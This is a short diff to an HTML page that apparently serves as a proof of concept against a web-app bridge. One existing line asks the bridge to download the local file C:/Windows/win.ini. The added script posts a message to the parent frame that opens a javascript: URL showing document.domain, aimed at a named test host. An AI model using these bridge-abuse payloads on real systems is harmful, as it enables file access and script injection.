@@ -2,3 +2,12 @@
 <script>
     WebApp.downloadFile("file:///C:/Windows/win.ini","test.html");
 </script>
+<script>
+window.parent.postMessage(
+  JSON.stringify({
+    type: "WebAppOpenLink",
+    url: "javascript:alert(document.domain)"
+  }),
+  "https://mr1609.web-test.oneme.ru"
+);
+</script>
